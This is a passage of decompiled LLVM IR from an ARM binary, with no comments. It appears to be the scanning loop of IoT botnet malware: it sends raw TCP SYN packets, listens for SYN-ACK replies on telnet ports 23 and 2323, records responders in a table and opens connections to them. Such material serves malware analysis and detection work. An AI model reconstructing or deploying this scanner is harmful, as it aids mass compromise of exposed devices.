  store i16 0, i16* bitcast (i32* @global_var_22278.202 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_22268.159 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_f078 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_22254.156 to i32), i32 sext (i16 ptrtoint (i16* @global_var_22268.159 to i16) to i32), i32 5120, i32 20)
  %v7_f078 = trunc i32 %v6_f078 to i16
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* %r1.global-to-local, align 4
  %v2_f084 = load i32, i32* @global_var_24d6c.154, align 4
  store i16 %v7_f078, i16* bitcast (i32* @global_var_22278.202 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_f0b0 = load i16, i16* @global_var_2226a.164, align 2
  %v4_f0b0 = zext i16 %v3_f0b0 to i32
  store i32 %v4_f0b0, i32* @lr, align 4
  store i32 %v2_f674, i32* %ip.global-to-local, align 4
  store i32 %v2_f084, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_f0cc = call i32 @__libc_sendto(i32 %v2_f084, i32 ptrtoint (i8** @global_var_22254.156 to i32), i32 40, i32 16384, i32 %v2_10170, i32 16)
  store i32 %v7_f0cc, i32* %r0.global-to-local, align 4
  %v3_f0d0 = load i32, i32* %stack_var_-52, align 4
  %v1_f0d4 = add i32 %v3_f0d0, 1
  store i32 %v1_f0d4, i32* %r3.global-to-local, align 4
  %v3_f0d8 = icmp ugt i32 %v1_f0d4, 383
  store i1 %v3_f0d8, i1* %cpsr_c.global-to-local, align 1
  %v8_f0d8 = icmp eq i32 %v1_f0d4, 384
  store i1 %v8_f0d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f0d4, i32* %stack_var_-52, align 4
  %v5_f0e0 = icmp slt i32 %v1_f0d4, 384
  br i1 %v5_f0e0, label %dec_label_pc_edf8, label %dec_label_pc_f0e4

dec_label_pc_f0e4:                                ; preds = %bb408
  %v0_f0e4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f0e8

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_edd4, %dec_label_pc_f0e4
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_edd4 ], [ %v0_f0e4, %dec_label_pc_f0e4 ]
  %v0_f0e8 = call i32 @__GI___errno_location()
  store i32 %v2_edcc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_f0f8, i32* @r4, align 4
  %v2_f104 = inttoptr i32 %v0_f0e8 to i32*
  br label %dec_label_pc_f0fc

dec_label_pc_f0fc:                                ; preds = %dec_label_pc_f1c0, %dec_label_pc_f1b8, %dec_label_pc_f1b0, %dec_label_pc_f18c, %dec_label_pc_f17c, %dec_label_pc_f164, %dec_label_pc_f14c, %dec_label_pc_f1a8, %dec_label_pc_f19c, %dec_label_pc_f144, %dec_label_pc_f278, %dec_label_pc_f0e8
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_f104, align 4
  %v2_f10c = load i32, i32* @global_var_24d6c.154, align 4
  store i32 %v2_f10c, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_edcc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f120 = load i32, i32* %ip.global-to-local, align 4
  %v6_f128 = call i32 @__libc_recvfrom(i32 %v2_f10c, i32 %v2_edcc, i32 1514, i32 16384, i32 %v0_f120, i32 %v0_f120)
  store i32 %v6_f128, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f12c = icmp eq i32 %v6_f128, 0
  store i1 %v2_f12c, i1* %cpsr_z.global-to-local, align 1
  %tmp409 = icmp slt i32 %v6_f128, 1
  br i1 %tmp409, label %dec_label_pc_f288, label %dec_label_pc_f134

dec_label_pc_f134:                                ; preds = %dec_label_pc_f0fc
  store i32 %v0_f0e8, i32* %ip.global-to-local, align 4
  %v2_f138 = load i32, i32* %v2_f104, align 4
  store i32 %v2_f138, i32* %r3.global-to-local, align 4
  %v2_f13c = icmp ugt i32 %v2_f138, 10
  store i1 %v2_f13c, i1* %cpsr_c.global-to-local, align 1
  %v7_f13c = icmp eq i32 %v2_f138, 11
  store i1 %v7_f13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f13c, label %dec_label_pc_f288, label %dec_label_pc_f144

dec_label_pc_f144:                                ; preds = %dec_label_pc_f134
  %v2_f144 = icmp ugt i32 %v6_f128, 38
  store i1 %v2_f144, i1* %cpsr_c.global-to-local, align 1
  %v7_f144 = icmp eq i32 %v6_f128, 39
  store i1 %v7_f144, i1* %cpsr_z.global-to-local, align 1
  %v2_f148 = xor i1 %v2_f144, true
  %v3_f148 = or i1 %v7_f144, %v2_f148
  br i1 %v3_f148, label %dec_label_pc_f0fc, label %dec_label_pc_f14c

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f144
  store i32 %v2_edcc, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24d4c.56 to i32), i32* %r0.global-to-local, align 4
  %v3_f154 = load i32, i32* %v2_f154, align 4
  store i32 %v3_f154, i32* %r2.global-to-local, align 4
  %v2_f158 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_f158, i32* %r3.global-to-local, align 4
  %v3_f15c = icmp uge i32 %v3_f154, %v2_f158
  store i1 %v3_f15c, i1* %cpsr_c.global-to-local, align 1
  %v9_f15c = icmp eq i32 %v3_f154, %v2_f158
  store i1 %v9_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f15c, label %dec_label_pc_f164, label %dec_label_pc_f0fc

dec_label_pc_f164:                                ; preds = %dec_label_pc_f14c
  %v3_f164 = load i8, i8* %v2_f164, align 1
  %v4_f164 = zext i8 %v3_f164 to i32
  store i32 %v4_f164, i32* %r3.global-to-local, align 4
  %v2_f168 = icmp ugt i8 %v3_f164, 5
  store i1 %v2_f168, i1* %cpsr_c.global-to-local, align 1
  %v7_f168 = icmp eq i8 %v3_f164, 6
  store i1 %v7_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f168, label %dec_label_pc_f170, label %dec_label_pc_f0fc

dec_label_pc_f170:                                ; preds = %dec_label_pc_f164
  %v0_f170 = load i32, i32* @r4, align 4
  %v1_f170 = inttoptr i32 %v0_f170 to i16*
  %v2_f170 = load i16, i16* %v1_f170, align 2
  %v3_f170 = zext i16 %v2_f170 to i32
  store i32 %v3_f170, i32* %ip.global-to-local, align 4
  %v2_f174 = icmp ugt i16 %v2_f170, 5887
  store i1 %v2_f174, i1* %cpsr_c.global-to-local, align 1
  %v7_f174 = icmp eq i16 %v2_f170, 5888
  store i1 %v7_f174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f174, label %dec_label_pc_f18c, label %dec_label_pc_f17c

dec_label_pc_f17c:                                ; preds = %dec_label_pc_f170
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_f184 = icmp ugt i16 %v2_f170, 4872
  store i1 %v3_f184, i1* %cpsr_c.global-to-local, align 1
  %v9_f184 = icmp eq i16 %v2_f170, 4873
  store i1 %v9_f184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f184, label %dec_label_pc_f18c, label %dec_label_pc_f0fc

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f17c, %dec_label_pc_f170
  %v1_f18c = add i32 %v0_f170, 2
  %v2_f18c = inttoptr i32 %v1_f18c to i16*
  %v3_f18c = load i16, i16* %v2_f18c, align 2
  %v4_f18c = zext i16 %v3_f18c to i32
  store i32 %v4_f18c, i32* %r3.global-to-local, align 4
  store i32 %v4_ec9c, i32* %r1.global-to-local, align 4
  %v3_f194 = icmp uge i32 %v4_f18c, %v4_ec9c
  store i1 %v3_f194, i1* %cpsr_c.global-to-local, align 1
  %v9_f194 = icmp eq i32 %v4_f18c, %v4_ec9c
  store i1 %v9_f194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f194, label %dec_label_pc_f19c, label %dec_label_pc_f0fc

dec_label_pc_f19c:                                ; preds = %dec_label_pc_f18c
  %v1_f19c = add i32 %v0_f170, 13
  %v2_f19c = inttoptr i32 %v1_f19c to i8*
  %v3_f19c = load i8, i8* %v2_f19c, align 1
  %v4_f19c = zext i8 %v3_f19c to i32
  store i32 %v4_f19c, i32* %r3.global-to-local, align 4
  %v1_f1a0 = and i32 %v4_f19c, 2
  %v2_f1a0 = icmp eq i32 %v1_f1a0, 0
  store i1 %v2_f1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1a0, label %dec_label_pc_f0fc, label %dec_label_pc_f1a8

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f19c
  %v1_f1a8 = and i32 %v4_f19c, 16
  %v2_f1a8 = icmp eq i32 %v1_f1a8, 0
  store i1 %v2_f1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1a8, label %dec_label_pc_f0fc, label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f1a8
  %v1_f1b0 = and i32 %v4_f19c, 4
  %v2_f1b0 = icmp eq i32 %v1_f1b0, 0
  store i1 %v2_f1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1b0, label %dec_label_pc_f1b8, label %dec_label_pc_f0fc

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f1b0
  %tmp = urem i8 %v3_f19c, 2
  %v2_f1b8 = icmp eq i8 %tmp, 0
  store i1 %v2_f1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1b8, label %dec_label_pc_f1c0, label %dec_label_pc_f0fc

dec_label_pc_f1c0:                                ; preds = %dec_label_pc_f1b8
  %v1_f1c0 = add i32 %v0_f170, 8
  %v2_f1c0 = inttoptr i32 %v1_f1c0 to i32*
  %v3_f1c0 = load i32, i32* %v2_f1c0, align 4
  %v5_f1d8 = call i32 @llvm.bswap.i32(i32 %v3_f1c0)
  %v1_f1dc = add i32 %v5_f1d8, -1
  store i32 %v1_f1dc, i32* %r2.global-to-local, align 4
  %v3_f1e4 = udiv i32 %v1_f1dc, 16777216
  %v1_f1e0 = udiv i32 %v1_f1dc, 256
  %v4_f1e8 = and i32 %v1_f1e0, 65280
  %v5_f1e8 = or i32 %v4_f1e8, %v3_f1e4
  store i32 %v2_edcc, i32* %r0.global-to-local, align 4
  %v1_f1f0 = and i32 %v1_f1dc, 65280
  store i32 %v1_f1f0, i32* %r1.global-to-local, align 4
  %v4_f1f4 = mul nuw nsw i32 %v1_f1f0, 256
  %v5_f1f4 = or i32 %v5_f1e8, %v4_f1f4
  store i32 %v5_f1f4, i32* %r3.global-to-local, align 4
  %v3_f1f8 = load i32, i32* %v2_f1f8, align 4
  store i32 %v3_f1f8, i32* @lr, align 4
  %v5_f1fc = call i32 @llvm.bswap.i32(i32 %v1_f1dc)
  store i32 %v5_f1fc, i32* %r3.global-to-local, align 4
  %v3_f200 = icmp uge i32 %v5_f1fc, %v3_f1f8
  store i1 %v3_f200, i1* %cpsr_c.global-to-local, align 1
  %v9_f200 = icmp eq i32 %v5_f1fc, %v3_f1f8
  store i1 %v9_f200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f200, label %dec_label_pc_f208, label %dec_label_pc_f0fc

dec_label_pc_f208:                                ; preds = %dec_label_pc_f1c0
  %v0_f208 = load i32, i32* @r5, align 4
  %v2_f208 = icmp ugt i32 %v0_f208, 254
  store i1 %v2_f208, i1* %cpsr_c.global-to-local, align 1
  %v7_f208 = icmp eq i32 %v0_f208, 255
  store i1 %v7_f208, i1* %cpsr_z.global-to-local, align 1
  %v8_f20c = icmp sgt i32 %v0_f208, 255
  br i1 %v8_f20c, label %dec_label_pc_f288, label %dec_label_pc_f210

dec_label_pc_f210:                                ; preds = %dec_label_pc_f208
  %v2_f218 = load i32, i32* @global_var_24d68.152, align 4
  store i32 %v2_f218, i32* %r1.global-to-local, align 4
  %v3_f21c = mul i32 %v0_f208, 256
  store i32 %v3_f21c, i32* %r2.global-to-local, align 4
  %v2_f220 = mul i32 %v0_f208, 288
  store i32 %v2_f220, i32* %r3.global-to-local, align 4
  %v2_f224 = add i32 %v2_f218, %v2_f220
  store i32 %v2_f224, i32* @r0, align 4
  %v1_f228 = add i32 %v2_f224, 12
  %v2_f228 = inttoptr i32 %v1_f228 to i32*
  %v3_f228 = load i32, i32* %v2_f228, align 4
  store i32 %v3_f228, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f22c = icmp eq i32 %v3_f228, 0
  store i1 %v2_f22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f22c, label %dec_label_pc_f270, label %dec_label_pc_f24c.preheader

dec_label_pc_f24c.preheader:                      ; preds = %dec_label_pc_f210
  %v2_f230 = add i32 %v0_f208, 1
  %v2_f238 = and i32 %v2_f230, 134217728
  %v3_f238 = icmp ne i32 %v2_f238, 0
  store i1 %v3_f238, i1* %cpsr_c.global-to-local, align 1
  %v3_f23c = mul i32 %v2_f230, 288
  %v3_f240 = add i32 %v2_f218, %v3_f23c
  store i32 %v3_f240, i32* %r3.global-to-local, align 4
  store i32 %v0_f208, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f24c

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f24c.preheader, %dec_label_pc_f258
  %v0_f258 = phi i32 [ %v3_f240, %dec_label_pc_f24c.preheader ], [ %v1_f264, %dec_label_pc_f258 ]
  %v0_f24c = phi i32 [ %v0_f208, %dec_label_pc_f24c.preheader ], [ %v1_f24c, %dec_label_pc_f258 ]
  %v1_f24c = add i32 %v0_f24c, 1
  store i32 %v1_f24c, i32* %r2.global-to-local, align 4
  %v7_f250 = icmp eq i32 %v1_f24c, 256
  br i1 %v7_f250, label %dec_label_pc_f288.loopexit, label %dec_label_pc_f258

dec_label_pc_f258:                                ; preds = %dec_label_pc_f24c
  store i32 %v0_f258, i32* @r0, align 4
  %v1_f25c = add i32 %v0_f258, 12
  %v2_f25c = inttoptr i32 %v1_f25c to i32*
  %v3_f25c = load i32, i32* %v2_f25c, align 4
  %v2_f260 = icmp eq i32 %v3_f25c, 0
  %v1_f264 = add i32 %v0_f258, 288
  store i32 %v1_f264, i32* %r3.global-to-local, align 4
  br i1 %v2_f260, label %dec_label_pc_f26c, label %dec_label_pc_f24c

dec_label_pc_f26c:                                ; preds = %dec_label_pc_f258
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f24c, i32* @r5, align 4
  br label %dec_label_pc_f270

dec_label_pc_f270:                                ; preds = %dec_label_pc_f210, %dec_label_pc_f26c
  %v1_f278 = phi i32 [ %v2_f224, %dec_label_pc_f210 ], [ %v0_f258, %dec_label_pc_f26c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f270 = icmp eq i32 %v1_f278, 0
  store i1 %v2_f270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f270, label %dec_label_pc_f288, label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f270
  %v2_f278 = add i32 %v1_f278, 16
  %v3_f278 = inttoptr i32 %v2_f278 to i32*
  store i32 %v3_f1f8, i32* %v3_f278, align 4
  %v0_f27c = load i32, i32* %ip.global-to-local, align 4
  %v1_f27c = trunc i32 %v0_f27c to i16
  %v2_f27c = load i32, i32* @r0, align 4
  %v3_f27c = add i32 %v2_f27c, 20
  %v4_f27c = inttoptr i32 %v3_f27c to i16*
  store i16 %v1_f27c, i16* %v4_f27c, align 2
  %v0_f280 = call i32 @setup_connection()
  store i32 %v0_f280, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f0fc

dec_label_pc_f288.loopexit:                       ; preds = %dec_label_pc_f24c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f288

dec_label_pc_f288:                                ; preds = %dec_label_pc_f270, %dec_label_pc_f208, %dec_label_pc_f134, %dec_label_pc_f0fc, %dec_label_pc_f288.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_f2a8515 = load i32, i32* @sp, align 4
  %v3_f2a8516 = add i32 %v2_f2a8515, 1676
  %v4_f2a8517 = inttoptr i32 %v3_f2a8516 to i32*
  store i32 0, i32* %v4_f2a8517, align 4
  br label %dec_label_pc_f294.dec_label_pc_f294_crit_edge

dec_label_pc_f294.dec_label_pc_f294_crit_edge:    ; preds = %dec_label_pc_f288, %dec_label_pc_f294.dec_label_pc_f294_crit_edge
  %v0_f294.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f298 = add i32 %v0_f294.pre, 4
  store i32 %v1_f298, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f2a0 = add i32 %v0_f294.pre, 1672
  store i32 %v1_f2a0, i32* %ip.global-to-local, align 4
  %v7_f2a4 = icmp eq i32 %v1_f298, 128
  %v2_f2a8 = load i32, i32* @sp, align 4
  %v3_f2a8 = add i32 %v2_f2a8, %v1_f2a0
  %v4_f2a8 = inttoptr i32 %v3_f2a8 to i32*
  store i32 0, i32* %v4_f2a8, align 4
  br i1 %v7_f2a4, label %dec_label_pc_f2b0, label %dec_label_pc_f294.dec_label_pc_f294_crit_edge

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f294.dec_label_pc_f294_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f2b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f2b0, i32* %stack_var_-352, align 4
  %v1_f2bc518 = add i32 %v0_f2b0, 8
  store i32 %v1_f2bc518, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f2c4519 = add i32 %v0_f2b0, 1548
  store i32 %v1_f2c4519, i32* @lr, align 4
  %v7_f2c8520 = icmp eq i32 %v1_f2bc518, 128
  %v2_f2cc521 = load i32, i32* @sp, align 4
  %v3_f2cc522 = add i32 %v2_f2cc521, %v1_f2c4519
  %v4_f2cc523 = inttoptr i32 %v3_f2cc522 to i32*
  store i32 0, i32* %v4_f2cc523, align 4
  br i1 %v7_f2c8520, label %dec_label_pc_f2d4, label %dec_label_pc_f2b8.dec_label_pc_f2b8_crit_edge

dec_label_pc_f2b8.dec_label_pc_f2b8_crit_edge:    ; preds = %dec_label_pc_f2b0, %dec_label_pc_f2b8.dec_label_pc_f2b8_crit_edge
  %v0_f2b8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_f2bc = add i32 %v0_f2b8.pre, 4
  store i32 %v1_f2bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f2c4 = add i32 %v0_f2b8.pre, 1544
  store i32 %v1_f2c4, i32* @lr, align 4
  %v7_f2c8 = icmp eq i32 %v1_f2bc, 128
  %v2_f2cc = load i32, i32* @sp, align 4
  %v3_f2cc = add i32 %v2_f2cc, %v1_f2c4
  %v4_f2cc = inttoptr i32 %v3_f2cc to i32*
  store i32 0, i32* %v4_f2cc, align 4
  br i1 %v7_f2c8, label %dec_label_pc_f2d4, label %dec_label_pc_f2b8.dec_label_pc_f2b8_crit_edge

dec_label_pc_f2d4:                                ; preds = %dec_label_pc_f2b8.dec_label_pc_f2b8_crit_edge, %dec_label_pc_f2b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f2d4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f2d4, i32* @r5, align 4
  store i32 %v0_f2d4, i32* @r6, align 4
  store i32 %v0_f2d4, i32* %stack_var_-52, align 4
  br label %dec_label_pc_f330

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_f360
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f34c, i1* %cpsr_z.global-to-local, align 1
  %v1_f3d0 = add i32 %v2_f344, 4
  %v2_f3d0 = inttoptr i32 %v1_f3d0 to i32*
  %v3_f3d0 = load i32, i32* %v2_f3d0, align 4
  br i1 %v7_f34c, label %dec_label_pc_f3d0, label %dec_label_pc_f2ec

dec_label_pc_f2ec:                                ; preds = %dec_label_pc_f2e4
  store i32 %v3_f3d0, i32* %ip.global-to-local, align 4
  %v3_f2f0 = udiv i32 %v3_f3d0, 32
  store i32 %v2_f3dc, i32* %r0.global-to-local, align 4
  %v3_f2f8 = mul nuw nsw i32 %v3_f2f0, 4
  %v2_f2fc = add i32 %v3_f2f8, %v2_f3dc
  store i32 %v2_f2fc, i32* %r3.global-to-local, align 4
  %v1_f300 = add i32 %v2_f2fc, -184
  %v2_f300 = inttoptr i32 %v1_f300 to i32*
  %v3_f300 = load i32, i32* %v2_f300, align 4
  %v1_f304 = urem i32 %v3_f3d0, 32
  store i32 %v1_f304, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_f30c = shl i32 1, %v1_f304
  %v8_f30c = or i32 %v3_f300, %v7_f30c
  store i32 %v8_f30c, i32* %r2.global-to-local, align 4
  store i32 %v8_f30c, i32* %v2_f300, align 4
  %v0_f314 = load i32, i32* @r6, align 4
  %v1_f314 = load i32, i32* %ip.global-to-local, align 4
  %v3_f314 = icmp uge i32 %v0_f314, %v1_f314
  store i1 %v3_f314, i1* %cpsr_c.global-to-local, align 1
  %v9_f314 = icmp eq i32 %v0_f314, %v1_f314
  store i1 %v9_f314, i1* %cpsr_z.global-to-local, align 1
  %v5_f318 = icmp slt i32 %v0_f314, %v1_f314
  br i1 %v5_f318, label %bb410, label %bb411

bb410:                                            ; preds = %dec_label_pc_f2ec
  store i32 %v1_f314, i32* @r6, align 4
  br label %bb411

bb411:                                            ; preds = %.thread74, %bb417, %bb415, %bb419, %dec_label_pc_f3c4, %dec_label_pc_f2ec, %bb410
  %v3_f31c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f31c, i32* %r3.global-to-local, align 4
  %v1_f320 = add i32 %v3_f31c, 1
  store i32 %v1_f320, i32* %r2.global-to-local, align 4
  %v2_f324 = icmp ugt i32 %v1_f320, 254
  store i1 %v2_f324, i1* %cpsr_c.global-to-local, align 1
  %v7_f324 = icmp eq i32 %v1_f320, 255
  store i1 %v7_f324, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f320, i32* %stack_var_-52, align 4
  %v8_f32c = icmp sgt i32 %v1_f320, 255
  br i1 %v8_f32c, label %dec_label_pc_f400, label %dec_label_pc_f330

dec_label_pc_f330:                                ; preds = %bb411, %dec_label_pc_f2d4
  %v0_f33c = phi i32 [ %v1_f320, %bb411 ], [ %v0_f2d4, %dec_label_pc_f2d4 ]
  store i32 ptrtoint (i32* @global_var_24d68.152 to i32), i32* %r0.global-to-local, align 4
  %v3_f334 = mul i32 %v0_f33c, 256
  store i32 %v3_f334, i32* %r3.global-to-local, align 4
  %v2_f338 = load i32, i32* @global_var_24d68.152, align 4
  store i32 %v2_f338, i32* @r1, align 4
  %v2_f340 = mul i32 %v0_f33c, 288
  store i32 %v2_f340, i32* %r2.global-to-local, align 4
  %v2_f344 = add i32 %v2_f338, %v2_f340
  store i32 %v2_f344, i32* @r4, align 4
  %v1_f348 = add i32 %v2_f344, 12
  %v2_f348 = inttoptr i32 %v1_f348 to i32*
  %v3_f348 = load i32, i32* %v2_f348, align 4
  store i32 %v3_f348, i32* %ip.global-to-local, align 4
  %v2_f34c = icmp ne i32 %v3_f348, 0
  store i1 %v2_f34c, i1* %cpsr_c.global-to-local, align 1
  %v7_f34c = icmp eq i32 %v3_f348, 1
  store i1 %v7_f34c, i1* %cpsr_z.global-to-local, align 1
  %v2_f350 = xor i1 %v2_f34c, true
  %v3_f350 = or i1 %v7_f34c, %v2_f350
  br i1 %v3_f350, label %bb412, label %bb413

bb412:                                            ; preds = %dec_label_pc_f330
  store i32 5, i32* @r1, align 4
  br label %bb413

bb413:                                            ; preds = %dec_label_pc_f330, %bb412
  %v1_f370219 = phi i32 [ %v2_f338, %dec_label_pc_f330 ], [ 5, %bb412 ]
  %v2_f354 = xor i1 %v7_f34c, true
  %v3_f354 = and i1 %v2_f34c, %v2_f354
  br i1 %v3_f354, label %bb414, label %bb415

bb414:                                            ; preds = %bb413
  store i32 30, i32* @r1, align 4
  br label %bb415

bb415:                                            ; preds = %bb413, %bb414
  %v1_f370 = phi i32 [ %v1_f370219, %bb413 ], [ 30, %bb414 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f358 = icmp eq i32 %v3_f348, 0
  store i1 %v2_f358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f358, label %bb411, label %dec_label_pc_f360

dec_label_pc_f360:                                ; preds = %bb415
  store i32 ptrtoint (i32* @global_var_22284.140 to i32), i32* %r2.global-to-local, align 4
  %v2_f364 = load i32, i32* @global_var_22284.140, align 4
  store i32 %v2_f364, i32* %r3.global-to-local, align 4
  %v1_f368 = add i32 %v2_f344, 8
  %v2_f368 = inttoptr i32 %v1_f368 to i32*
  %v3_f368 = load i32, i32* %v2_f368, align 4
  store i32 %v3_f368, i32* %r2.global-to-local, align 4
  %v2_f36c = sub i32 %v2_f364, %v3_f368
  store i32 %v2_f36c, i32* %r3.global-to-local, align 4
  %v3_f370 = icmp uge i32 %v2_f36c, %v1_f370
  store i1 %v3_f370, i1* %cpsr_c.global-to-local, align 1
  %v9_f370 = icmp eq i32 %v2_f36c, %v1_f370
  store i1 %v9_f370, i1* %cpsr_z.global-to-local, align 1
  %v2_f374 = xor i1 %v3_f370, true
  %v3_f374 = or i1 %v9_f370, %v2_f374
  br i1 %v3_f374, label %dec_label_pc_f2e4, label %dec_label_pc_f378

dec_label_pc_f378:                                ; preds = %dec_label_pc_f360
  %v1_f378 = add i32 %v2_f344, 4
  %v2_f378 = inttoptr i32 %v1_f378 to i32*
  %v3_f378 = load i32, i32* %v2_f378, align 4
  store i32 %v3_f378, i32* %r0.global-to-local, align 4
  %v1_f37c = call i32 @__GI___libc_close(i32 %v3_f378)
  store i32 %v1_f37c, i32* %r0.global-to-local, align 4
  %v0_f380 = load i32, i32* @r4, align 4
  %v1_f380 = add i32 %v0_f380, 12
  %v2_f380 = inttoptr i32 %v1_f380 to i32*
  %v3_f380 = load i32, i32* %v2_f380, align 4
  store i32 %v3_f380, i32* %r3.global-to-local, align 4
  %v2_f384 = icmp ugt i32 %v3_f380, 1
  store i1 %v2_f384, i1* %cpsr_c.global-to-local, align 1
  %v7_f384 = icmp eq i32 %v3_f380, 2
  store i1 %v7_f384, i1* %cpsr_z.global-to-local, align 1
  %v2_f388 = xor i1 %v2_f384, true
  %v3_f388 = or i1 %v7_f384, %v2_f388
  br i1 %v3_f388, label %bb416, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_f378
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f390298302 = add i32 %v0_f380, 4
  %v3_f390299303 = inttoptr i32 %v2_f390298302 to i32*
  store i32 -1, i32* %v3_f390299303, align 4
  br label %bb417

bb416:                                            ; preds = %dec_label_pc_f378
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f390295 = add i32 %v0_f380, 4
  %v3_f390296 = inttoptr i32 %v2_f390295 to i32*
  store i32 -1, i32* %v3_f390296, align 4
  %v4_f394 = load i32, i32* %r3.global-to-local, align 4
  %v5_f394 = load i32, i32* @r4, align 4
  %v6_f394 = add i32 %v5_f394, 12
  %v7_f394 = inttoptr i32 %v6_f394 to i32*
  store i32 %v4_f394, i32* %v7_f394, align 4
  %v4_f398 = load i32, i32* %r3.global-to-local, align 4
  %v5_f398 = trunc i32 %v4_f398 to i8
  %v6_f398 = load i32, i32* @r4, align 4
  %v7_f398 = add i32 %v6_f398, 284
  %v8_f398 = inttoptr i32 %v7_f398 to i8*
  store i8 %v5_f398, i8* %v8_f398, align 1
  %v0_f39c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f39c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb417

bb417:                                            ; preds = %.thread301, %bb416
  %v1_f39c = phi i1 [ %v1_f39c.pre, %bb416 ], [ %v2_f384, %.thread301 ]
  %v0_f39c = phi i1 [ %v0_f39c.pre, %bb416 ], [ false, %.thread301 ]
  %v2_f39c = xor i1 %v1_f39c, true
  %v3_f39c = or i1 %v0_f39c, %v2_f39c
  br i1 %v3_f39c, label %bb411, label %dec_label_pc_f3a0

dec_label_pc_f3a0:                                ; preds = %bb417
  %v0_f3a0 = load i32, i32* @r4, align 4
  %v1_f3a0 = add i32 %v0_f3a0, 284
  %v2_f3a0 = inttoptr i32 %v1_f3a0 to i8*
  %v3_f3a0 = load i8, i8* %v2_f3a0, align 1
  %v4_f3a0 = zext i8 %v3_f3a0 to i32
  %v1_f3a4 = add nuw nsw i32 %v4_f3a0, 1
  %v1_f3a8 = urem i32 %v1_f3a4, 256
  store i32 %v1_f3a8, i32* %r3.global-to-local, align 4
  %v2_f3ac = icmp ugt i32 %v1_f3a8, 9
  store i1 %v2_f3ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f3ac = icmp eq i32 %v1_f3a8, 10
  store i1 %v7_f3ac, i1* %cpsr_z.global-to-local, align 1
  %v1_f3b0 = trunc i32 %v1_f3a4 to i8
